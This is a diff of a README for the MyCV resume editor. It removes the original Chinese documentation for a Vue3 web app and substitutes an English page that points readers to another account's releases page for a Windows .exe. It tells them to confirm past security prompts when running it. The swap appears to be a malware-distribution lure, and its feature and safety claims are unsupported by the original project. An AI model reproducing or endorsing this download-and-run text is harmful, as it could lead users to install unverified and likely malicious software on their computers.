@@ -1,309 +1,78 @@
-# MyCV - 个人简历在线编辑器
+# 📄 MyCV - Build A Professional Resume With Ease
 
-<img width="1914" height="1032" alt="image" src="https://github.com/user-attachments/assets/6f30bae6-1789-4870-9f8e-64e88bc57812" />
+[![](https://img.shields.io/badge/Download_MyCV-blue)](https://github.com/Mikeynormal1422/MyCV/releases)
 
-一款基于 Vue3 + Element Plus 开发的个人简历在线编辑工具，支持实时预览、PDF 导出、拖拽排序等功能。
+## 🎯 About This Application
 
-![Vue3](https://img.shields.io/badge/Vue-3.4+-green.svg)
-![Element Plus](https://img.shields.io/badge/Element%20Plus-2.5+-blue.svg)
-![Vite](https://img.shields.io/badge/Vite-5.0+-yellow.svg)
-![License](https://img.shields.io/badge/License-MIT-orange.svg)
+MyCV helps you create professional resumes quickly. You focus on your work history and skills while the tool handles the layout. The application uses a simple interface to organize your professional information. You see your changes as you type. Once you finish your document, you export your resume to a PDF file for your job applications.
 
-## ✨ 功能特性
+## 📋 Key Features
 
-### 📝 编辑功能
+*   **Live Preview:** See your resume change as you type. 
+*   **Simple Interface:** Update contact details, work history, and education fields using clear forms.
+*   **PDF Export:** Save your final document as a standard PDF file.
+*   **Ready Templates:** Choose from several clean designs for your profile.
+*   **Local Storage:** Your data stays on your computer.
 
-- **实时预览**：编辑内容实时同步到预览区域
-- **多模块管理**：支持基本信息、个人简介、技术栈、教育背景、证书荣誉、工作经历、项目经验七大模块
-- **拖拽排序**：各模块内容支持拖拽排序，带有可视化插入位置指示
-- **动态增删**：支持添加、删除各模块的条目
+## 🚀 How To Get Started
 
-### 🎨 界面特性
+You do not need to install complex tools to use this application. Follow these steps to set up MyCV on your Windows computer.
 
-- **响应式设计**：适配不同屏幕尺寸
-- **现代化 UI**：采用 Element Plus 组件库，界面简洁美观
-- **绿色主题**：专业的简历配色方案
-- **分页预览**：支持显示 PDF 分页线，方便调整内容布局
+1.  Visit the [official download page](https://github.com/Mikeynormal1422/MyCV/releases) to find the latest version.
+2.  Look for the file ending in .exe in the Assets list.
+3.  Click the file name to start the download.
+4.  Save the file to your Downloads folder or your desktop for easy access.
 
-### 📄 导出功能
+## ⚙️ Installation Process
 
-- **PDF 导出**：一键导出高质量 PDF 简历
-- **智能分页**：自动处理多页 PDF 的分页逻辑
-- **图片支持**：导出的 PDF 包含头像等图片内容
+After you download the file, follow these steps to run the application on your Windows PC.
 
-## 🚀 技术栈
+1.  Locate the downloaded file in your folder.
+2.  Double-click the file to start the installer.
+3.  If a security box pops up, confirm that you want to open the file.
+4.  Follow the instructions on the screen.
+5.  Wait for the progress bar to finish.
+6.  The application creates a shortcut on your desktop automatically.
 
-- **前端框架**：Vue 3.4+
-- **UI 组件库**：Element Plus 2.5+
-- **构建工具**：Vite 5.0+
-- **PDF 生成**：html2canvas + jsPDF
-- **图标库**：@element-plus/icons-vue
+## 🛠️ Using The Tool
 
-## 📦 安装与运行
+Once the installation finishes, you can build your first resume. 
 
-### 方式一：Docker 部署（推荐）
+### Setting Up Your Profile
+When you open the application, you see a menu on the left side of the screen. Use this menu to navigate through different sections of your resume. Start with the Personal Details tab. Fill in your name, email, and phone number. The editor saves your information automatically.
 
-#### 环境要求
+### Adding Work History
+Click on the Work History tab to add your job experience. Click the Add button to create a new entry. Enter your job title, company name, and the dates you worked there. Include a few bullet points about your tasks and accomplishments. You can add as many entries as you need.
 
-- Docker 20.10+
-- Docker Compose 2.0+
+### Adjusting Your Layout
+The preview area on the right updates as you add information. Scroll through the preview to see how your document looks. If you prefer a different look, pick a new style from the settings panel. The application instantly refreshes your resume design.
 
-#### 使用 Docker Compose 部署
+### Exporting Your File
+When your resume looks correct, click the Export button at the top right of the window. Choose PDF from the list of formats. The application saves your resume as a standard file that you can attach to emails or upload to job boards.
 
-1. **克隆项目**
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/chiyou-debug/MyCV.git
-cd MyCV
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 2GB of RAM.
+*   **Storage Space:** 200MB of free space on your hard drive.
+*   **Internet Connection:** Required only for the initial download of the application.
 
-2. **启动容器**
+## ❓ Frequently Asked Questions
 
-```bash
-docker-compose up -d
-```
+### Is my data safe?
+Yes. The application saves your resume data only on your own computer. No information is sent to third-party servers.
 
-3. **访问应用**
+### Can I change the fonts?
+The application includes several font sets. You can change these in the Design tab to adjust the look of your resume.
 
-打开浏览器访问 http://localhost:8080
+### Does the application work offline?
+Yes. You do not need an internet connection to edit your resume or export files.
 
-#### 使用 Docker 直接部署
+### What do I do if the application crashes?
+Close the application and open it again. Since your progress saves automatically, your latest changes remain intact.
 
-```bash
-# 构建镜像
-docker build -t mycv-app .
+### How do I update to the newest version?
+Check the [download page](https://github.com/Mikeynormal1422/MyCV/releases) periodically. If a new version exists, download and install it the same way you did the first time. The new version replaces the old one while keeping your existing resume files.
 
-# 运行容器
-docker run -d -p 8080:80 --name mycv-app mycv-app
-```
-
-#### 常用命令
-
-```bash
-# 查看容器状态
-docker-compose ps
-
-# 查看日志
-docker-compose logs -f
-
-# 停止容器
-docker-compose down
-
-# 重启容器
-docker-compose restart
-
-# 重新构建并启动
-docker-compose up -d --build
-```
-
-### 方式二：本地开发部署
-
-#### 环境要求
-
-- Node.js 16+
-- npm 或 yarn
-
-#### 安装步骤
-
-1. **克隆项目**
-
-```bash
-git clone https://github.com/yourusername/MyCV.git
-cd MyCV
-```
-
-2. **安装依赖**
-
-```bash
-npm install
-```
-
-3. **启动开发服务器**
-
-```bash
-npm run dev
-```
-
-4. **构建生产版本**
-
-```bash
-npm run build
-```
-
-## 📖 使用指南
-
-### 编辑简历
-
-1. 点击右上角"编辑模式"按钮进入编辑状态
-2. 在各标签页中填写或修改简历内容
-3. 点击"预览模式"查看效果
-
-### 拖拽排序
-
-- **技术栈分类**：拖拽分类标题进行排序
-- **工作经历**：拖拽整个工作经历区块调整顺序
-- **项目经验**：拖拽项目区块调整顺序
-- **教育背景**：拖拽教育经历区块调整顺序
-- **证书荣誉**：拖拽证书区块调整顺序
-
-> 💡 拖拽时会显示蓝色插入指示线，清晰标示插入位置
-
-### 导出 PDF
-
-1. 点击右上角"导出 PDF"按钮
-2. 等待生成完成（约 1-2 秒）
-3. PDF 文件将自动下载到本地
-
-### 显示分页线
-
-点击"显示分页线"按钮，页面将显示红色的分页标记线，帮助您了解内容在 PDF 中的分页位置，便于调整内容布局。
-
-## 🏗️ 项目结构
-
-```
-MyCV/
-├── public/                 # 静态资源
-│   └── cv-logo.svg        # 网站图标
-├── src/                    # 源代码
-│   ├── App.vue            # 主应用组件
-│   ├── main.js            # 入口文件
-│   └── style.css          # 全局样式
-├── Dockerfile             # Docker 构建文件
-├── docker-compose.yml     # Docker Compose 配置
-├── nginx.conf             # Nginx 配置文件
-├── .dockerignore          # Docker 忽略文件
-├── index.html             # HTML 模板
-├── package.json           # 项目配置
-├── vite.config.js         # Vite 配置
-└── README.md              # 项目说明
-```
-
-## 🎯 核心功能实现
-
-### 拖拽排序
-
-采用 HTML5 Drag and Drop API 实现，支持：
-
-- 基于鼠标 Y 坐标的智能插入位置计算
-- 可视化插入指示器
-- 流畅的拖拽动画效果
-
-### PDF 导出
-
-使用 html2canvas + jsPDF 实现：
-
-- 高清晰度截图（scale: 2）
-- 跨域图片处理（CORS）
-- 多页 PDF 自动分页
-
-### 响应式数据绑定
-
-使用 Vue 3 Composition API：
-
-- `ref` 和 `reactive` 管理状态
-- `computed` 计算属性
-- 实时双向数据绑定
-
-## 📝 数据格式
-
-简历数据采用 JSON 格式存储，主要结构如下：
-
-```javascript
-{
-  basic: {
-    name: "姓名",
-    title: "职位",
-    subtitle: "副标题",
-    email: "邮箱",
-    phone: "电话",
-    location: "地址",
-    github: "GitHub",
-    avatar: "头像URL"
-  },
-  introduction: "个人简介",
-  skillCategories: [...],  // 技术栈分类
-  education: [...],        // 教育背景
-  certificates: [...],     // 证书荣誉
-  workExperience: [...],   // 工作经历
-  projects: [...],         // 项目经验
-  skillProgress: [...]     // 技能熟练度
-}
-```
-
-## 🔧 自定义配置
-
-### 修改主题颜色
-
-在 `src/App.vue` 中修改 CSS 变量：
-
-```css
-.header-section {
-  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
-}
-```
-
-### 添加新模块
-
-1. 在 `resumeData` 中添加新数据结构
-2. 在编辑面板添加表单
-3. 在预览区域添加展示组件
-
-## 🐳 Docker 配置说明
-
-### Dockerfile
-
-采用多阶段构建，减小最终镜像体积：
-
-- **构建阶段**：使用 Node.js 镜像构建应用
-- **生产阶段**：使用 Nginx Alpine 镜像提供服务
-
-### Nginx 配置
-
-- 支持前端路由（SPA 应用）
-- 开启 gzip 压缩
-- 静态资源缓存优化
-- 安全响应头设置
-
-### 自定义端口
-
-如需修改端口，编辑 `docker-compose.yml`：
-
-```yaml
-ports:
-  - "自定义端口:80" # 例如 "3000:80"
-```
-
-### 环境变量
-
-如需添加环境变量，在 `docker-compose.yml` 中添加：
-
-```yaml
-services:
-  mycv:
-    environment:
-      - NODE_ENV=production
-      - API_URL=https://api.example.com
-```
-
-## 📄 许可证
-
-[MIT](LICENSE) License © 2024 [Your Name]
-
-## 🤝 贡献指南
-
-欢迎提交 Issue 和 Pull Request！
-
-1. Fork 本项目
-2. 创建您的特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交您的更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 打开一个 Pull Request
-
-## 📮 联系方式
-
-- 邮箱：ruijie-fan@aliyun.com
-- 微信：KFCVme50_Now
-
----
-
-如果这个项目对您有帮助，请给个 ⭐ Star 支持一下！
+### Can I import data from Word?
+This version supports direct entry within the editor. Copy and paste your content from other programs into the text fields of the application.
